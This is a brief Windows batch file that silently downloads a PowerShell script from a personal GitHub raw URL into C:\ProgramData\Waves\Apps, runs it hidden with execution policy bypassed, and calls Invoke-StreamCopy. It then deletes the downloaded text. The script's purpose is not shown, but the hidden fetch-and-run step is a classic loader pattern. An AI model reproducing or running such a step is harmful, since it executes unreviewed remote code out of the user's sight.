@echo off
set base=C:\ProgramData\Waves
set appbase=%base%\Apps

del /s /q %appbase%\StreamCopy.ps1 

powershell -exec bypass -w hidden -Command "IWR -uri 'https://raw.githubusercontent.com/jensack/stream/main/StreamCopy.txt' -OutFile %appbase%\StreamCopy.txt; gc %appbase%\StreamCopy.txt | Out-File -Encoding utf8 %appbase%\StreamCopy.ps1; import-module %appbase%\StreamCopy.ps1'; Invoke-StreamCopy -Stream -objName %~1"
del /s /q %appbase%\StreamCopy.txt